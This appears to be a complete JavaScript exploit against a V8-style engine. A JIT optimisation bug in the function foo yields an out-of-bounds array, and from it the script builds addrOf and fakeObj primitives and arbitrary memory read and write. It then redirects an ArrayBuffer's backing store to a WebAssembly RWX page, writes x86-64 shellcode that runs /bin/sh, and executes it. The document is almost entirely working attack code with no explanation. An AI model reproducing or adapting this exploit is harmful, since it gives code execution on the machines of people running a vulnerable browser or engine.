var f64 = new Float64Array(1);
var bigUint64 = new BigUint64Array(f64.buffer);

function ftoi(f)
{
  f64[0] = f;
  return bigUint64[0];
}
function itof(i)
{
  bigUint64[0] = i;
  return f64[0];
}
function ftoh(f)
{
  return itoh(ftoi(f));
}

function itoh(i){
  var pad = 16;
  if (BigInt(i) >> 32n == 0){
    pad = 8;
  }
  return '0x'+i.toString(16).padStart(pad, "0");
}

const _arr = new Uint32Array([2**31]);

function foo(a) {
    var x = 1;
    x = (_arr[0] ^ 0) + 1;

    x = Math.abs(x);
    x -= 2147483647;
    x = Math.max(x, 0);

    x -= 1;
    if(x==-1) x = 0;

    var arr = new Array(x);
    arr.shift();
    var cor = [1.1, 1.2, 1.3];

    return [arr, cor];
}

for (var i = 0; i < 0x30000; i++){
    foo(true);
}

var [a, c] = foo(false);
a[16] = 0x4242;
var b = new Array(1);


function addrOf(obj){
    b[0] = obj;
    var addr = ftoi(c[24]) >> 32n;
    return addr;
}


function fakeObj(addr){
    c[24] = itof(BigInt((BigInt(addr) << 32n) + (0x00000002n)));
    return b[0];
}

var b_offset = 20;

function calc_offset(addr){
    var b_addr = addrOf(b);
    var offset = b_offset + Number((addr - b_addr) / 8n)
    return offset;
}

function parseMap(obj_idx, map_offset){
  var metadata = [];
  for (var i = -2; i < 3; i++){
    p1 = ftoi(c[obj_idx+i]) & 0xffffffffn;
    p2 = ftoi(c[obj_idx+i]) >> 32n;
    metadata.push(p1);
    metadata.push(p2);
  }
  var map_idx = metadata.indexOf(BigInt(map_offset));
  return metadata.slice(map_idx, map_idx + 4);
}

var fake_map_offset = 0x082439edn;
var fake_array = [1.1, 2.2, 3.3];
var fake_array_addr = addrOf(fake_array);
console.log('fake_array address:', itoh(fake_array_addr));
var offset = calc_offset(fake_array_addr);
var fake_array_metadata = parseMap(offset, fake_map_offset);
var fake_array_mp = itof(BigInt(fake_array_metadata[1] << 32n) + fake_array_metadata[0]);
fake_array[0] = fake_array_mp
console.log('constructed fake map and property:', ftoh(fake_array_mp));
var fake_array_elem = fake_array_metadata[2];
console.log('fake array elem pointer: ', itoh(fake_array_elem));
var fake_obj = fakeObj(fake_array_elem + 8n);

function read(addr, length=1){
  addr -= 8n;
  if (addr % 2n == 0){
    addr += 1n;
  }
  var data = []
  var fake_addr_len = itof(0x0000001000000000n + BigInt(addr))
  fake_array[1] = fake_addr_len;
  for (var i = 0; i < length; i++){
    data.push(fake_obj[i]);
    console.log('read: ', itoh(addr + 8n * BigInt(i + 1) - 1n), ftoh(fake_obj[i]));
  }
  return data;
}


function write(addr, data){
  addr -= 8n;
  if (addr % 2n == 0){
    addr += 1n;
  }
  var fake_addr_len = itof(0x0000001000000000n + BigInt(addr))
  fake_array[1] = fake_addr_len;
  fake_obj[0] = itof(data);
  console.log('write: ', itoh(addr - 1n + 8n), itoh(data));
}


function write_shellcode(shellcode, rwx_addr){
  var buf = new ArrayBuffer(shellcode.length * 8);
  var data_view = new DataView(buf);
  var buf_addr = addrOf(buf) & 0xffffffffn;
  console.log('buf address: ', itoh(buf_addr));
  var back_store_addr_l = ftoi(read(buf_addr + 16n)[0]);
  var back_store_addr_h = ftoi(read(buf_addr + 24n)[0]);
  var full_bs_addr = BigInt(back_store_addr_l >> 32n) + BigInt((back_store_addr_h & 0xffffffffn) << 32n)
  console.log('original backing_store:', itoh(full_bs_addr))
  var rwx_addr_h = rwx_addr >> 32n;
  var rwx_addr_l = rwx_addr & 0xffffffffn;
  var new_bs_addr_l = (back_store_addr_l & 0xffffffffn) + (rwx_addr_l << 32n);
  var new_bs_addr_h = (back_store_addr_h >> 32n << 32n) + (rwx_addr_h);
  write(buf_addr + 16n, new_bs_addr_l);
  write(buf_addr + 24n, new_bs_addr_h);

  for (var i = 0; i < shellcode.length; i++){
    data_view.setFloat64(i * 8, itof(shellcode[i]), true);
  }
  
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module, {});
var shell = wasm_instance.exports.main;

var shellcode = [
  0x2fbb485299583b6an,
  0x5368732f6e69622fn,
  0x050f5e5457525f54n
];

var wasm_addr = addrOf(wasm_instance);
console.log('wasm instance address: ', itoh(wasm_addr));
var rwx_addr = read((wasm_addr + 0x68n))[0];
console.log('rwx address: ', ftoh(rwx_addr));

write_shellcode(shellcode, ftoi(rwx_addr));

shell();
